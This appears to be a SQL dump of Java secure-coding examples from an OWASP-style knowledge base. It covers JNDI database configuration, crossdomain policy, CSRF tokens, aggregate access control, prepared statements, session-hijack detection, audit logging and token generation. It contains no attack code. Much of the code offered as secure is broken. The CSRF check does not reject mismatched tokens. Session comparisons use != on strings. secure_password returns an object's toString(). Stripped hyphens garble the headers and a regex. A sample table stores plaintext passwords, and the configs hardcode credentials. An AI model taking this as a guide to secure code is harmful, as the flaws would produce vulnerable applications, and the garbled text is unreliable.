                (handles[0]), new Integer(index), new Integer(maxlen + 1)});
            String value = readString(hkey, key, new String(name));
            results.put(new String(name).trim(), value);
        }
        regCloseKey.invoke(root, new Object[] { new Integer(handles[0]) });
        return results;
      }

      private static List<String> readStringSubKeys
        (Preferences root, int hkey, String key)
        throws IllegalArgumentException, IllegalAccessException,
        InvocationTargetException 
      {
          List<String> results = new ArrayList<String>();
          int[] handles = (int[]) regOpenKey.invoke(root, new Object[] {
              new Integer(hkey), toCstr(key), new Integer(KEY_READ) 
          });
          if (handles[1] != REG_SUCCESS) 
          {
              return null;
          }
          int[] info = (int[]) regQueryInfoKey.invoke(root,
              new Object[] { new Integer(handles[0]) });

          int count  = info[0]; // Fix: info[2] was being used here with wrong results. Suggested by davenpcj, confirmed by Petrucio
          int maxlen = info[3]; // value length max
          for(int index=0; index<count; index++)  {
              byte[] name = (byte[]) regEnumKeyEx.invoke(root, new Object[] {
                  new Integer
                    (handles[0]), new Integer(index), new Integer(maxlen + 1)
              });
              results.add(new String(name).trim());
          }
          regCloseKey.invoke(root, new Object[] { new Integer(handles[0]) });
          return results;
      }

      private static int [] createKey(Preferences root, int hkey, String key)
        throws IllegalArgumentException, IllegalAccessException, InvocationTargetException 
      {
          return  (int[]) regCreateKeyEx.invoke(root,
              new Object[] { new Integer(hkey), toCstr(key) });
      }

      private static void writeStringValue 
        (Preferences root, int hkey, String key, String valueName, String value) 
          throws IllegalArgumentException, IllegalAccessException, InvocationTargetException 
      {
          int[] handles = (int[]) regOpenKey.invoke(root, new Object[] {
              new Integer(hkey), toCstr(key), new Integer(KEY_ALL_ACCESS) });

          regSetValueEx.invoke(root,  
              new Object[] { 
                  new Integer(handles[0]), toCstr(valueName), toCstr(value) 
              }); 
          regCloseKey.invoke(root, new Object[] { new Integer(handles[0]) });
      }

      // utility
      private static byte[] toCstr(String str) {
          byte[] result = new byte[str.length() + 1];
          for (int i = 0; i < str.length(); i++) {
              result[i] = (byte) str.charAt(i);
          }
          result[str.length()] = 0;
          return result;
      }
    }
    
', 'WinRegistry', 'java'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Secure Database Configuration


 Example:

    
    // in order for the connection to be secure, it is best practice the credentials and all the relevant sensitive information about the database to be kept at the server configuration files. For this reason the following changes have been made at tomcat''s server.xml configuration file. 

    <Resource auth="Container" driverClassName="com.mysql.cj.jdbc.Driver" maxActive="100" maxIdle="30" maxWait="10000" name="jdbc/myJdbc" password="javadude" type="javax.sql.DataSource" url="jdbc:mysql://localhost:3306/aggregate_control" username="user"/>

    <Resource auth="Container" driverClassName="com.mysql.cj.jdbc.Driver" maxActive="100" maxIdle="30" maxWait="10000" name="jdbc/auditlogs_Jdbc" password="javadude" type="javax.sql.DataSource" url="jdbc:mysql://localhost:3306/auditlogs" username="user"/>

    the above configuration example indicates that there are two different mysql connections to the database. One refers to the auditlog database and the other refers to the aggregate_control database using the jdbc mysql connector. As you can see the mysql username and password are residing in the web application server configuration file.

    As for the server side code, in order to be informed of the existence of the databases, the following code must be located in the file /METAINF/context.xml

    <?xml version="1.0" encoding="UTF8"?>

    <Context path="/JServletSide" docBase="/JServletSide"
      crossContext="true" reloadable="true" debug="1">


    <Resource name="jdbc/myJdbc" auth="Container" type="javax.sql.DataSource"
              maxActive="100" maxIdle="30" maxWait="10000"
              username="user" password="javadude" 
              driverClassName="com.mysql.cj.jdbc.Driver"
              url="jdbc:mysql://localhost:3306/aggregate_control"/>

    <Resource name="jdbc/auditlogs_Jdbc" auth="Container" type="javax.sql.DataSource"
              maxActive="100" maxIdle="30" maxWait="10000"
              username="user" password="javadude" 
              driverClassName="com.mysql.cj.jdbc.Driver"
              url="jdbc:mysql://localhost:3306/auditlogs"/>
              </Context>

    The above snippet indicates the database  resource that will be use in the servlet in order to perform a successful connection to the database

    Afterwards the following servlet snippet will be used for the database connection. 

    Context initContext = new InitialContext();
    Context webContext  = (Context)initContext.lookup("java:/comp/env");
    DataSource ds = (DataSource)webContext.lookup("jdbc/myJdbc");
    Connection conn = ds.getConnection();

    the init context line refers to the database resource inside the context.xml file

    Also in order for the application to map the database reference we have to include the following lines inside the /WEBINF/web.xml 
    
    <resourceref>
        <description>DB Connection</description>
        <resrefname>jdbc/myJdbc</resrefname>
        <restype>javax.sql.DataSource</restype>
        <resauth>Container</resauth>
      </resourceref>
      <resourceref>
        <description>DB Connection</description>
        <resrefname>jdbc/auditlogs_Jdbc</resrefname>
        <restype>javax.sql.DataSource</restype>
        <resauth>Container</resauth>
      </resourceref>

      ', 'Secure Database Configuration', 'java'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Crossdomain XML


 Example:


    A bad example of a crossdomain.xml would be:

    <?xml version="1.0" ?>
    <crossdomainpolicy>
      <sitecontrol permittedcrossdomainpolicies="masteronly"/>
      <allowaccessfrom domain="*"/>
      <allowhttprequestheadersfrom domain="*" headers="*"/>
    </crossdomainpolicy>

    Because it allows access from all other domains.

    Instead of this approach you might want to use the following restrictions. 
    Example by twitter''s crossdomain.xml:

    <?xml version="1.0" encoding="UTF8"?>
    <crossdomainpolicy xmlns:xsi="http://www.w3.org/2001/XMLSchemainstance" 
    xsi:noNamespaceSchemaLocation="http://www.adobe.com/xml/schemas/PolicyFile.xsd">
      <allowaccessfrom domain="twitter.com" />
        <allowaccessfrom domain="api.twitter.com" />
        <allowaccessfrom domain="search.twitter.com" />
        <allowaccessfrom domain="static.twitter.com" />
        <sitecontrol permittedcrossdomainpolicies="masteronly"/>
      <allowhttprequestheadersfrom domain="*.twitter.com" headers="*" secure="true"/>
    </crossdomainpolicy>
', 'Crossdomain XML', 'java'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' CSRF Token 


 Example:


	/*
	For CSRF tokens we used a separate class outside of the normal controller, since
	it must be reused on several locations throughout the application

	First after a successful validation of a user login, the application must also start a session
	which contains the "cross site request forgery" token.
	*/

	//For generating the token we want to use a secure cryptographic function
	SecureRandom random = new SecureRandom();

	//Then we generate a long value token containing a high entropy
	byte[] randomBytes  = new byte[128];

	random.nextBytes(randomBytes);

	//Then we base64 encode the string
	String csrftoken = Base64.getEncoder().encodeToString(randomBytes);

	HttpSession session 
	session.setAttribute( "CSRF", csrftoken);

	/*
	The next step is implementing this random token in each form field as a hidden input parameter
	and send it to a function which checks if the submitted token is equal to the one set after successful validation.
	*/

	<%
		Object token = request.getSession().getAttribute("CSRF");
		String tokenStr = "";
		if (token != null)
		{
			tokenStr = (String) token;
		}		 
	%>

	<html>
	<head>
	<meta httpequiv="ContentType" content="text/html; charset=ISO88591">
	<title>Insert title here</title>
	</head>
	<body>
		Welcome to the OWASP CSRFGuard Test Application! Where would you like to go?
	<br/>

	<form action="/Home/csrf" method="post">
		<input type="text" name="testValue" /> 
		<br/> 
		<input type="hidden" value="<%=tokenStr%>" name="token"/>
		<input type="submit" value="login">
	</form>

	*/

	package com.edw;
	import java.io.IOException;
	import javax.servlet.RequestDispatcher;
	import javax.servlet.ServletException;
	import javax.servlet.annotation.WebServlet;
	import javax.servlet.http.HttpServlet;
	import javax.servlet.http.HttpServletRequest;
	import javax.servlet.http.HttpServletResponse;

	@WebServlet("/CheckCSRF")

	public final class CheckCSRF extends HttpServlet
	{

		private static final long serialVersionUID = 1L;

		public CheckCSRF() {
			super();
		}

		//here we are sending the token towards the function which does the token validation    
		protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {

			String token = request.getParameter("token");
			String sessionToken = (String) request.getSession().getAttribute("CSRF")

			if(!sessionToken.equals(token))
			{ 

				/*
				If there was no match, the authentication session will be emptied and sessions will be abandoned. Then, the user must be redirected towards the login page.
				*/		
				if ("".equalsIgnoreCase(request.getSession().getAttribute("authenticateUser")))
				{
					request.getSession().invalidate();
					request.setAttribute("msg", "Served at: " + request.getContextPath());
					RequestDispatcher rd =  request.getRequestDispatcher("/login");
					rd.forward(request, response);
					return;
				}
			}	
		}

		protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
			super.doGet(request, response);
		}
    }

', 'CSRF Token', 'java'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Aggregate User Control 


 Example:


	/*
	In order to enforce Aggregate access control protection the best method would be to 
	define your rules by means of a database structure rather than sessions or logs.

	Verify the system can protect against aggregate or continuous access of secured functions, 
	resources, or data. For example, consider the use of a resource governor to limit the number 
	of edits per hour or to prevent the entire database from being scraped by an individual user.

	TABLE users
	   
	| userID | userName | password | privilegeID |    access    |     aggregate	    |
	  
	|   1    | Admin    | Csdar323 |      1      |     TRUE     |       2322        |
	   
	|   2    | User     | Adf4fsv  |      2      |     FALSE    |         0         |
	  
	|   3    | Guest    | dff4fKr  |      3      |     TRUE     |        125        |   
	

	TABLE privileges
	   
	| privilegeID | privilege        | 
	
	|     1       | edit:read:delete |
	
	|     2       | edit:read        |
	
	|     3       | read             |
	

	The following code snippets can be used in relation with this class in order to have a full implemented example 
	*/

	// HTML/JSP page index.jsp

	<%@page contentType="text/html" pageEncoding="UTF8"%>

	<!DOCTYPE html>
	<html>
		<head>
			<meta httpequiv="ContentType" content="text/html; charset=UTF8">
			<title>Insert Value</title>
		</head>
		<body>
			<form method="post" action="aggregateControl">
			<table>
				<tr>
					<td>Name  : </td>
					<td><input type="text" id="name" name="name" /></td>
				</tr>  
				<tr>
					<td>Surname : </td>
					<td><input type="text" id="surname" name="surname" /></td>
				</tr>
				<tr>
					<td>Password : </td>
					<td><input type="text" id="password" name="password" /></td>
				</tr>               
				<tr>
					<td><input type="hidden" id="userID" value="2" name="userID" /></td>
				</tr>         
				<tr>
					<td colspan="2"><input type="submit" /></td>               
				</tr>
				</table>
			</form>     
		</body>
	</html>


	// Servlet 

	//The following code snippet can be used in relation with the following servlet snippet


	public final class AggregateControl extends HttpServlet{
		private static final long serialVersionUID = 1L;
		public aggregateControl() {
			super();
		}
		
		final static Logger logger = Logger.getLogger(AggregateControl.class);
		private String userName;
		private String password;
		private String userID;

		protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException 
		{	
			userName = request.getParameter("name");
			userID = request.getParameter("userID");
			Aggregate ag = new Aggregate();
			ag.setUserName(userName);
			ag.setUserID(userID);
			boolean invalidate_sessions = ag.aggregateControl(0);
			
			if (invalidate_sessions == true)
			{
				request.getSession().invalidate();			
			}
			
			doGet(request, response);
		}

	/*		
	Output logs indicating that user has been logged out after many database connections  

	[ .... ] 

	20161124 11:17:55 INFO  Aggregate:277  Connection to the database was made successfully   User: ddd  User ID:  2 Time: 20170705T12:19:20.803
	20161124 11:18:07 INFO  Aggregate:277  Connection to the database was made successfully   User: ddd  User ID:  2 Time: 20170705T12:36:09.763
	20161124 11:18:15 INFO  Aggregate:277  Connection to the database was made successfully   User: ddd  User ID:  2 Time: 20170705T12:36:52.443
	20161124 11:18:23 INFO  Aggregate:277  Connection to the database was made successfully   User: ddd  User ID:  2 Time: 20170705T12:37:28.358
	20161124 11:18:32 INFO  Aggregate:277  Connection to the database was made successfully   User: ddd  User ID:  2 Time: 20170705T12:38:03.250
	20161124 11:18:39 INFO  Aggregate:277  Connection to the database was made successfully   User: ddd  User ID:  2 Time: 20170705T12:38:36.413
	20161124 11:18:49 INFO  Aggregate:240   User account was locked out due to aggregate user control system  User: ddd  Userid ID:  2
	20161124 11:18:49 INFO  Aggregate:277  Connection to the database was made successfully   User: ddd  User ID:  2

	[ ..... ]

	The following example gives another implementation of Aggregate class
	*/

	package com.edw;

	import java.sql.Connection;
	import java.sql.PreparedStatement;
	import java.sql.ResultSet;
	import java.sql.SQLException;

	import javax.naming.Context;
	import javax.naming.InitialContext;
	import javax.naming.NamingException;
	import javax.sql.DataSource;

	import org.apache.log4j.Logger;

	package prime.com.beans;

	import java.sql.Connection;
	import java.sql.PreparedStatement;
	import java.sql.ResultSet;
	import java.sql.SQLException;
	import java.time.LocalDateTime;

	import javax.naming.Context;
	import javax.naming.InitialContext;
	import javax.naming.NamingException;
	import javax.sql.DataSource;

	import org.apache.log4j.Logger;

	public final class Aggregate {

		private String userName;
		private String password;
		private String userID;
		private int control = 0;		
		
		final static Logger logger = Logger.getLogger(Aggregate.class);

		public boolean aggregateControl(int count, String userName, String userID)
		{		
			boolean invalidate_sessions = false; 
				
			//Here we connect to the database by means of a connection string as configured in the web.xml and /METAINF/context.xml 
			Connection conn = null;
			try {
						
				Context initContext = new InitialContext();
				Context webContext  = (Context)initContext.lookup("java:/comp/env");
				DataSource ds = (DataSource)webContext.lookup("jdbc/myJdbc");
				conn = ds.getConnection();	

				//Here we select the number of counts from aggregate column in order to verify the number of connections:
				String query = "SELECT aggregate from users WHERE userID = ?";
			
				PreparedStatement st = conn.prepareStatement(query);
				st.setString(1, userID);
				
				// execute the query, and get a java result set
				//We bind the parameter in order to prevent SQL injections

				ResultSet rs = st.executeQuery();
				
				while (rs.next())
				{
					control  = rs.getInt("aggregate");
					userName  = rs.getString("userName");
				}

				//We update the aggregate table in the database in order to 
				//keep track of the number of connections the user made
				count = control + 1;
				
				// create the java mysql update prepared statement
				String query2 = "UPDATE users SET aggregate = ? WHERE userID = ?";
				PreparedStatement preparedStmt2 = conn.prepareStatement(query2);
				preparedStmt2.setInt(1, count);
				preparedStmt2.setString(2, userID);

				// execute the java prepared statement
				preparedStmt2.executeUpdate();
				
				/*
				Every time the user accesses the database we keep track of the number of times he
				connected. Whenever the user passes a reasonable number he should be rejected 
				since he could be an attacker scraping your table contents and stealing company information
				You could a CRON job or stored procedure in your system in order to 
				clean the Aggregate column within certain time frames
				*/
				
				if ( control > 5000)
				{		
					//this breach has to be reported into the log files
					logger.info( " User account was locked out due to aggregate user control system" + "  User: " + userName + "  User ID:  " +  userID + "Time: " + LocalDateTime.now());

					/*
					Whenever the reasonable number of connections the user made was surpassed we destroy all the 
					sessions to deny the user any further access to the system. This session invalidation is controlled from the SERVLET 
					
					*/
					invalidate_sessions = true; 
					
					/*
					Than we set his access level on his account to FALSE in order to prevent 
					him from logging in again till you did your Forensics on the log files
					*/
					
					// create the java MySql update prepared statement
		
					int access = 0; //0 is considered as FALSE in MySQL
					String query3 = "UPDATE users SET access = ? WHERE userID = ?";
					PreparedStatement preparedStmt3 = conn.prepareStatement(query3);
					preparedStmt3.setInt(1, access);
					preparedStmt3.setString(2, userID);

					// execute the java prepared statement
					preparedStmt3.executeUpdate();
					preparedStmt3.close();
						
				}
				st.close();
				preparedStmt2.close();
				conn.close();

			} catch (SQLException | NamingException e) {
					logger.error("cannot update database. check query" + e.toString() );
			}	      
				
			//the connection has to be reported into the log files
			if(logger.isInfoEnabled()){
				logger.info("Connection to the database was made successfully " + "  User: " + userName + "  User ID:  " +  userID + "Time: " + LocalDateTime.now() );
			}else{
				logger.error("Couldnt connect to database  " +  "  User: " + userName + "  User ID:  " +  userID + "Time: " + LocalDateTime.now());
			}
			
		return invalidate_sessions;
		}

		public String getUserName() {
			return userName;
		}

		public void setUserName(String userName) {
			this.userName = userName;
		}

		public String getPassword() {
			return password;
		}

		public void setPassword(String password) {
			this.password = password;
		}

		public String getUserID() {
			return userID;
		}

		public void setUserID(String userID) {
			this.userID = userID;
		}
	}
    	', 'Aggregate user contol', 'java'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' SQL Query JDBC


 Example:


    /*
     The JDBC library provides an API for building SQL commands that sanitize untrusted data. Use the java.sql.PreparedStatement class properly to escape input strings and prevent SQL injection.
     This example uses a parametric query with a ? character as a placeholder for the argument, and also validates the length of the username argument, preventing an attacker from submitting an arbitrarily long user name.
    */

    public void doPrivilegedAction(
        String username, char[] password
    ) throws SQLException {
        Connection connection = getConnection();
        if (connection == null) {
            // Handle error
        }
        try {
            String pwd = hashPassword(password);
            // Validate username length
            if (username.length() > 8) {
                // Handle error
            }
        
            String sqlString = "select * from db_user where username=? and password=?";
            PreparedStatement stmt = connection.prepareStatement(sqlString);
            stmt.setString(1, username);
            stmt.setString(2, pwd);
            ResultSet rs = stmt.executeQuery();
            if (!rs.next()) {
                throw new SecurityException("User name or password incorrect");
            }
            // Authenticated; proceed
        } finally {
            try {
                connection.close();
            } catch (SQLException x) {
                // Forward to handler
            }
        }
    }


', 'SQL query JDBC', 'java'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' SQL Query prepared statement and binding


 Example: 


    /*
    This example uses a prepared statement in order to insert data into the database.
    Because this method enforces the user to prepare all user input  passed into the query, it always escapes SQL injections so none could be accidentally forgotten.

    For detecting a possible attack on your application simply escaping the user input is obviously not enough.
    Therefore, you''ll want to verify the input as submitted by the user does not contain malicious code.
    In this example the expected input is az/09:
    */

    :::java 
    String employeeId = request.getParameter(''userId'');
    String salary = request.getParameter(''salary'');
    Pattern numeric = Pattern.compile(".*[^09].*");
    if(!numeric.matcher(employeeId).find() && !numeric.matcher(salary).find()){

        /*
        Always log an action first and then perform the action:
        Set a log for whenever there is unexpected userinput with a threat level
        */
        log(userId, "Invalid expected input", "FAIL", Calendar.getInstance(), "privilege", "HIGH" );

        /*
        Set counter; if counter hits 3 the user''s session must terminated.
        After 3 session terminations, the user''s account must be blocked
        */
        counter++;
        if(counter > 2 ){
                blockUser(userId);
        }

        String updateQuery = "UPDATE EMPLOYEES SET SALARY = ? WHERE ID = ?";
        PreparedStatement preparedStatement = connection.prepareStatement(updateQuery);
        preparedStatement.setInt(1, salary);
        preparedStatement.setInt(2, employeeId);
    }

    // Always use parameterized queries with prepared statements.
    // For example, with Hibernate (HQL) named parameters

    :::java
    Query query = session.createQuery("UPDATE EMPLOYEES SET SALARY = :salary WHERE ID = :employeeId");
    query.setParameter("salary", salary);
    query.setParameter("employeeId", employeeId);

    // Or with JPA:

    :::java
    Query query = entityManager.createQuery("UPDATE EMPLOYEES SET SALARY = :salary WHERE ID = :employeeId");
    query.setParameter("salary", salary);
    query.setParameter("employeeId", employeeId);

', 'SQL Query', 'java'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Session hijacking and fixation 


 Example:


	/*
	As soon as a user logs into your application you must store his session id as wel as his
	IP address along with his userID. This information will be used later on in your application in order to
	identify possible session hijacking.

	TABLE track_sessions
	
	| TrackID | userID |               session                  |     ipaddress     | 
	
	|   1     | 1      |    79dcd529c0f5e01a9bfb2425c52036c6    |   123.45.67.89    |   
	
	|   2     | 1      |    79dcd529c0f5e01a9bfb2425c52036c6    |   123.45.67.81    |
	
	|   3     | 2      |    c80959d3ea4c166413774e45375ac2a1    |   987.65.43.21    |
	

	In order to prevent session hijacking there are a couple of defense strategies
	which combined are a hardened defense.  
	*/

	/*
	First we implement the strict transport security header, this is in order to prevent
	users from accessing your application over an unprotected connection.
	*/

	//Example of the strict transport security header:
	// response.setHeader("StrictTransportSecurity", "maxage=31536000");


	//If all present and future subdomains will be HTTPS:
	//response.setHeader("StrictTransportSecurity", "maxage=31536000; includeSubdomains;");


	/*
	Recommended: If the site owner would like their domain to be included in the HSTS preload 
	list maintained by Chrome (and used by Firefox and Safari), then use:
	*/

	// response.setHeader("StrictTransportSecurity", "maxage=31536000; includeSubdomains; preload");


	/*
	The `preload` flag indicates the site owner''s consent to have their domain preloaded. The preload list
	enforces the browser to always present your application on HTTPS even on the first time
	the user hits your application
	*/

	/*
	Then we set the httpOnly flag
	(see "HttpOnly" in the code examples for more details about implementation)
	*/

	/*
	Then we set the flag for session timeout
	(see "Timeout" in the code examples for more details about implementation)
	*/

	/*
	Then we set the session secure flag 
	(see "Secure flag" in the code examples for more details about implementation)
	*/

	/*
	On login we also add another cookie with a random value to the application in order to
	prevent an attacker to fixate an JSSESSION id on your users and hijack their sessions
	(This code example can be found in the "Login functionality" for more detailed information)
	*/

	/*
	NOTE: On applications that require high level security, there should never be a
	remember me functionality implemented.
	*/

	/*
	Now imagine the scenario after the login of the user (see the "login functionality" in
	the code examples for more details). Whenever the user is logged in, the users ip address 
	and session id are also stored in the database these values are used in order to verify 
	if there are multiple users active on the same session. 
	If so, we can let the user decide to terminate the session and terminate the
	other assigned sessions.
	*/

	package com.edw;

	import java.io.IOException;
	import java.sql.*;
	import javax.naming.Context;
	import javax.naming.InitialContext;
	import javax.naming.NamingException;
	import javax.servlet.RequestDispatcher;
	import javax.servlet.ServletException;
	import javax.servlet.http.HttpServlet;
	import javax.servlet.http.HttpServletRequest;
	import javax.servlet.http.HttpServletResponse;
	import javax.servlet.http.HttpSession;
	import javax.sql.DataSource;

	import org.apache.log4j.Logger;

	public final class SessionHijack extends HttpServlet{
		
		private static final long serialVersionUID = 1L;
		
		public SessionHijack() {
			super();
		}
		
		//First we include the audit log class.
		final static Logger logger = Logger.getLogger(SessionHijack.class);
			
		private int userID;
		private String ipaddress;
		private String sess ;
		private String user_ID ;
		private String trackID ;

		protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException 
		{
			user_ID = request.getSession().getId(); 	
			//Here we connect to the database
			Connection conn = null;
			
			if ((request.getSession().getAttribute("authenticateUser") != "isLoggedin") || 
				(request.getSession().getAttribute("authenticateUser") == ""))
				{			
					RequestDispatcher rd =
					request.getRequestDispatcher("/login");
					rd.forward(request, response);							
				}

			try {
				Context initContext = new InitialContext();
				Context webContext  = (Context)initContext.lookup("java:/comp/env");
				DataSource ds = (DataSource)webContext.lookup("jdbc/myJdbc");
				conn = ds.getConnection();	
				
				String query = "SELECT * from tracking WHERE userId = ?";
				PreparedStatement st = conn.prepareStatement(query);
				st.setString(1, user_ID);
				
				// execute the query, and get a java resultset
				//We bind the parameter in order to prevent sql injections
				ResultSet rs = st.executeQuery();
				
				//Next we read the value from the database and put it into a variable
				while (rs.next())
				{
					sess  = rs.getString("session");
					ipaddress = rs.getString("ipaddress");
					trackID =  rs.getString("TrackID");
					
					if ((request.getSession().getAttribute("JSSESSIONID").toString() != sess) && 
						(ipaddress != request.getRemoteAddr()))
						{   
						
							//We log the multiple users on the system 
							logger.info("Multiple users with same session id detected" + "  User ID:  " +  userID);
							/*
							We redirect the user to a page which alerts him as well as gives him the option to destroy the 
							multiple sessions if he does not trust them
							*/

							RequestDispatcher rd =
							request.getRequestDispatcher("/Home/multipleUsers");
							rd.forward(request, response);
						}		        
				}		      
				st.close();
				conn.close();		
			} catch (SQLException | NamingException e) {
				logger.error("cannot search database. check query" + e.toString() );
			}
			doGet(request, response);
		}	
		
		protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
			response.getWriter().append("Served at: ").append(request.getContextPath()).append("  OWASP Knowledge Base Code Examples");
		}

	}
	/*
	the only thing left to do now is to update your track_sessions table by inserting
	the ipaddress, sessionID and userID if you want to accept the other sessions as valid.
	Otherwise the user just has to terminate the current session in order to lock out the
	other sessions.
	*/
		', 'session hijacking and fixation', 'java'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' AuditLogs


 Example:


	package com.edw;
	import java.io.BufferedWriter;
	import java.io.FileWriter;
	import java.io.IOException;
	import java.io.PrintWriter;
	import java.sql.Connection;
	import java.sql.PreparedStatement;
	import java.sql.ResultSet;
	import java.sql.SQLException;
	import java.time.LocalDateTime;

	import javax.naming.Context;
	import javax.naming.InitialContext;
	import javax.naming.NamingException;
	import javax.sql.DataSource;

	import org.apache.log4j.Logger;

	public final class AuditLog {
	
		private int countID;
		private int userID; 
		private int count; 
		private int blocker; 
		public static String validation = "pass"; 
		
		final static Logger logger = Logger.getLogger(AuditLog.class);
		
		
		public void SetLog(String userid, String message, String state, LocalDateTime localDateTime, String ThreatLevel, String remote_address)
		{

			try(FileWriter fw = new FileWriter("C:\\log.txt", true);
					BufferedWriter bw = new BufferedWriter(fw);
					PrintWriter out = new PrintWriter(bw))
				{
					out.println(userid + "  " + message + "  " + remote_address /*REMOTE_ADDR from servlet*/ + "  " + state + "  " + LocalDateTime.now()
					+ "  " +  localDateTime);

				} catch (IOException e) {
					logger.error("cannot write to file : "  + e.toString());
				}		
		}
		
		public void SetLog(String userid, String message, String state, LocalDateTime localDateTime, String ThreatLevel)
		{
			
			try(FileWriter fw = new FileWriter("C:\\log.txt", true);
					BufferedWriter bw = new BufferedWriter(fw);
					PrintWriter out = new PrintWriter(bw))
				{
					out.println(userid + "  " + message + "  " + state + "  " + LocalDateTime.now()
					+ "  " +  localDateTime);

				} catch (IOException e) {
					logger.error("cannot write to file : "  + e.toString());
				}		
		}
		
		public String counter(int counting)
		{

			Connection connect = null;
			try {
				
				Context initContext = new InitialContext();
				Context webContext  = (Context)initContext.lookup("java:/comp/env");
				DataSource ds = (DataSource)webContext.lookup("jdbc/myJdbc");
				connect = ds.getConnection();			
				
				/*
				First we select the counts from the count table in order to verify if the user session should be terminated
				or that the user should be locked out.
				*/
				String sqlquery = "SELECT * from counter";
			
				//We bind the parameter in order to prevent sql injections
				PreparedStatement state = connect.prepareStatement(sqlquery);
				
				// execute the query, and get a java resultset
				ResultSet res = state.executeQuery();
				
				//Next we read the value from the database and put it into a variable
				while (res.next())
				{
					userID = res.getInt("userID");
					count  = res.getInt("count");
					blocker = res.getInt("blocker");
				}
				
				state.close();
				connect.close();
				
			} catch (SQLException | NamingException e) {
					logger.error("cannot search database. check query" + e.toString() );
					return "cannot search database. check query"; 
			}
			
			Connection conn = null;
			try {
				
				Context initContext = new InitialContext();
				Context webContext  = (Context)initContext.lookup("java:/comp/env");
				DataSource ds = (DataSource)webContext.lookup("jdbc/myJdbc");
				conn = ds.getConnection();			
				
				/*
				First we select the counts from the count table in order to verify if the user session should be terminated
				or that the user should be locked out.
				*/
				String query = "SELECT * from counter WHERE userID = ?";
			
				//We bind the parameter in order to prevent sql injections
				PreparedStatement st = conn.prepareStatement(query);
				st.setInt(1, userID);
				
				// execute the query, and get a java resultset
				ResultSet rs = st.executeQuery();
				
				//Next we read the value from the database and put it into a variable
				while (rs.next())
				{
					count  = rs.getInt("count");
					blocker = rs.getInt("blocker");
				}
				
				st.close();
				conn.close();
			
			} catch (SQLException | NamingException e) {
				logger.error("cannot search database. check query" + e.toString() );
				return "cannot search database. check query"; 
			}
			
			
			//We add the counting to the database results for the final value
			count  = count + counting; 
			int finalCount = count;
			blocker = blocker + counting;
			int finalBlock = blocker;
			
			//Here we connect to the database  
			Connection conn2 = null;
			try {
			Context initContext2 = new InitialContext();
			Context webContext2  = (Context)initContext2.lookup("java:/comp/env");
			DataSource ds2 = (DataSource)webContext2.lookup("jdbc/myJdbc");
			conn2 = ds2.getConnection();	
			
			// create the java mysql update preparedstatement
			String query2 = "UPDATE counter SET count = ?, blocker = ? WHERE userID = ?";
			PreparedStatement preparedStmt2 = conn2.prepareStatement(query2);
			preparedStmt2.setInt(1, count);
			preparedStmt2.setInt(2, blocker);
			preparedStmt2.setInt(3, userID);

			// execute the java preparedstatement
			preparedStmt2.executeUpdate();
			
			
			conn2.close();
			} catch (SQLException | NamingException e) {
				logger.error("SQL insert query error in update counter" + e.toString() );
				return "SQL insert query error in update counter";  // this can be used to dispatch the response back to the client showing a corresponding message
				} 
			
			
			if (finalCount == 3)
			{
				validation = "terminate";        	
			}

			if (finalBlock > 3)
			{        	
				int access = 0; //0 is considered as FALSE in MySQL
				
				//Here we connect to the database  
				Connection conn3 = null;
				try {
					Context initContext3 = new InitialContext();
					Context webContext3  = (Context)initContext3.lookup("java:/comp/env");
					DataSource ds3 = (DataSource)webContext3.lookup("jdbc/myJdbc");
					conn3 = ds3.getConnection();	
					
					// create the java mysql update prepared statement
					String query3 = "UPDATE users set access = ? WHERE userID = ?";
					PreparedStatement preparedStmt3 = conn3.prepareStatement(query3);
					preparedStmt3.setInt(1, access);
					preparedStmt3.setInt(3, userID);

					// execute the java preparedstatement
					preparedStmt3.executeUpdate();
					
					validation = "block";
					
					conn3.close();
				} catch (SQLException | NamingException e) {    					    			
					logger.error("SQL insert query error in update access" + e.toString() );
					return "SQL insert query error in update access" ;  // this can be used to dispatch the response back to the client showing a corresponding message   		    		
				}	
			}
			
			return validation;    		
		}		
	}

', 'AuditLog', 'java'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Randomizer function


 Example:


    package com.edw;

    import java.security.SecureRandom;
    import java.util.ArrayList;
    import java.util.Base64;
    import java.util.List;
    import org.apache.log4j.Logger;

    public final class Randomizer {
        
        private List<Integer> bytes = new ArrayList<>();
        private int address = 0;
        final static Logger logger = Logger.getLogger(Randomizer.class);
        
        public String randomize()
        {		
            SecureRandom csprng = new SecureRandom();
            byte[] randomBytes = new byte[128];
            csprng.nextBytes(randomBytes);
            String csrftoken = Base64.getEncoder().encodeToString(randomBytes);
            
            return csrftoken;		
        }
        
        public String generateToken(int numberOfBytes)
        {		
            SecureRandom csprng = new SecureRandom();
            byte[] randomBytes = new byte[numberOfBytes];
            csprng.nextBytes(randomBytes);
            String csrftoken = null;
            try {
                csrftoken = this.bin2hex(randomBytes[0]);
            } catch (Exception e) {
                logger.error("Randomizer error : " + e.toString());
            }
            return csrftoken;		
        }
        public String generate(int numberOfBytes)
        {		
            SecureRandom csprng = new SecureRandom();
            byte[] randomBytes = new byte[numberOfBytes];
            csprng.nextBytes(randomBytes);
            String csrftoken = Base64.getEncoder().encodeToString(randomBytes);
            return csrftoken;		
        }
        
        public String secure_password(int numberOfBytes)
        {		
            SecureRandom csprng = new SecureRandom();
            byte[] randomBytes = new byte[numberOfBytes];
            csprng.nextBytes(randomBytes);
            String token = randomBytes.toString();
            return token;		
        }
        

        public void setAddress(int address) 
        {
            this.address = address;
        }

        public String bin2hex(int byt) throws Exception 
        {
            if (bytes.size() == 0xFF) 
            {
                throw new Exception("Too many bytes");        
            }
            bytes.add(byt);
            int sum = 0;
            StringBuilder sb = new StringBuilder();
            sb.append('':'');
            sb.append(toHexString(bytes.size(), 2));
            sum += bytes.size();
